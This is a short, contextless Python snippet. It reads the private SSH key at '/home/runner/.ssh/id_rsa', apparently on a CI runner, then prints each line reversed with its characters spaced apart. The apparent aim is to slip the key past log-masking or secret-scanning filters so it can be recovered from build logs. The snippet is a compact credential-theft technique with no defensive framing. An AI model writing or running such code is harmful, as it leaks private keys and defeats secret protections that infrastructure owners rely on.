with open('/home/runner/.ssh/id_rsa', 'r') as f:
    for line in f.readlines():
        print(*[i + ' ' for i in line[::-1]])

